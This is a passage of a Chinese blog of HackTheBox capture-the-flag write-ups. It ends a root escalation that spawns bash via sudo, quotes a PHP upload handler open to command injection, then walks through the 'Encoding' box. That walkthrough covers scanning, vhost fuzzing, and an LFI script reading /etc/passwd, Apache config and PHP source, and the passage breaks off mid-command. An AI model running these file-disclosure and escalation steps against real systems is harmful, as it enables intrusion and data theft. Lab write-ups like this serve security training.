&quot;/bin/bash&quot;;&#x27;</span> &gt; /tmp/bfl</span><br><span class="line">sudo -u root /usr/bin/binary file:///tmp/bfl lDnxUysaQn</span><br></pre></td></tr></table></figure><p>get root, 查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a5dc64d395878aa52ec1bc85c579d67</span><br></pre></td></tr></table></figure><hr /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]==<span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line"><span class="variable">$image_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$original_name</span> = <span class="variable">$image_name</span>;</span><br><span class="line"><span class="variable">$sanitised</span> = preg_replace(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$original_name</span>);</span><br><span class="line"><span class="variable">$image_type</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="variable">$image_name</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$image_name</span>);</span><br><span class="line"><span class="variable">$folder</span>=time();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$image_type</span>[<span class="string">&#x27;mime&#x27;</span>], <span class="variable">$allow_type</span>))&#123;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$mime</span>) = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$width</span>&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$height</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">mkdir(<span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>);</span><br><span class="line"><span class="variable">$upload</span> = move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/var/www/uploads/&#x27;</span>.<span class="variable">$folder</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$upload</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27; has been uploaded. The analysis report can be viewed &lt;a href=analysed_images/&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27;.txt&gt;here&lt;/a&gt; &lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Please save this report as it will only be available for the next five minutes&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$folder</span> = <span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;cd <span class="subst">$folder</span> &amp;&amp; /opt/exiftool/exiftool * &gt; /var/www/html/analysed_images/<span class="subst">$sanitised</span>.txt&quot;</span>;</span><br><span class="line">shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allowed&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allow&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error: Invalid File Type!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思是没必要用<code>`</code></p><hr /><h1 id="hackthebox_encoding"><a class="markdownIt-Anchor" href="#hackthebox_encoding"></a> HackTheBox_Encoding</h1><h2 id="信息收集-10"><a class="markdownIt-Anchor" href="#信息收集-10"></a> 信息收集</h2><h3 id="端口扫描-27"><a class="markdownIt-Anchor" href="#端口扫描-27"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.198</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.198</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举-7"><a class="markdownIt-Anchor" href="#路径枚举-7"></a> 路径枚举</h3><p>在站点中获得域名信息<code>haxtables.htb</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\thaxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="vhost-3"><a class="markdownIt-Anchor" href="#vhost-3"></a> VHOST</h3><p>枚举VHOST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://haxtables.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.haxtables.htb&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                             </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000000051:   200        0 L      0 W        0 Ch        &quot;api&quot;                                               </span><br><span class="line">000000177:   403        9 L      28 W       284 Ch      &quot;image&quot;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\tapi.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\timage.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-25"><a class="markdownIt-Anchor" href="#漏洞利用-25"></a> 漏洞利用</h2><p>页面给出的API调用方法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;str2hex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://example.com/data.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>参数<code>file_url</code>可能存在LFI漏洞</p><p>利用API进行LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://api.haxtables.htb/v3/tools/string/index.php --json <span class="string">&#x27;&#123;&quot;action&quot;:&quot;b64encode&quot;,&quot;file_url&quot;:&quot;file:///etc/passwd&quot;&#125;&#x27;</span> | jq -r .data | base64 -d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>编写如下<code>lfi.py</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;file://%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">data = json.loads(res.text)</span><br><span class="line">print(b64decode(data[<span class="string">&quot;data&quot;</span>]).decode())</span><br></pre></td></tr></table></figure><p>读取apache2站点配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName api.haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;api</span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName image.haxtables.htb</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        </span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;image</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">    #SecRuleEngine On</span><br><span class="line"></span><br><span class="line">    &lt;LocationMatch &#x2F;&gt;</span><br><span class="line">        SecAction initcol:ip&#x3D;%&#123;REMOTE_ADDR&#125;,pass,nolog,id:&#39;200001&#39;</span><br><span class="line">        SecAction &quot;phase:5,deprecatevar:ip.somepathcounter&#x3D;1&#x2F;1,pass,nolog,id:&#39;200002&#39;&quot;</span><br><span class="line">        SecRule IP:SOMEPATHCOUNTER &quot;@gt 5&quot; &quot;phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:&#39;200003&#39;&quot;</span><br><span class="line">        SecAction &quot;phase:2,pass,setvar:ip.somepathcounter&#x3D;+1,nolog,id:&#39;200004&#39;&quot;</span><br><span class="line">        Header always set Retry-After &quot;10&quot; env&#x3D;RATELIMITED</span><br><span class="line">    &lt;&#x2F;LocationMatch&gt;</span><br><span class="line"></span><br><span class="line">    ErrorDocument 429 &quot;Rate Limit Exceeded&quot;</span><br><span class="line"></span><br><span class="line">        &lt;Directory &#x2F;var&#x2F;www&#x2F;image&gt;</span><br><span class="line">                Deny from all</span><br><span class="line">                Allow from 127.0.0.1</span><br><span class="line">                Options Indexes FollowSymLinks</span><br><span class="line">                AllowOverride All</span><br><span class="line">                Require all granted</span><br><span class="line">        &lt;&#x2F;DIrectory&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure><p>站点<code>image.haxtables.htb</code>仅允许本地访问</p><p>读取<code>image.haxtables.htb/index.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /var/www/image/index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/coming_soon.html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取<code>image.haxtables.htb/utils.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/utils.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;z</span><br><span class="line">    <span class="variable">$status</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /usr/bin/git status&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_log</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;&#x27;</span> . addslashes(<span class="variable">$file</span>) . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$commit</span> = shell_exec(<span class="string">&#x27;sudo -u svc /var/www/image/scripts/git-commit.sh&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$commit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该路径疑似存在git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py 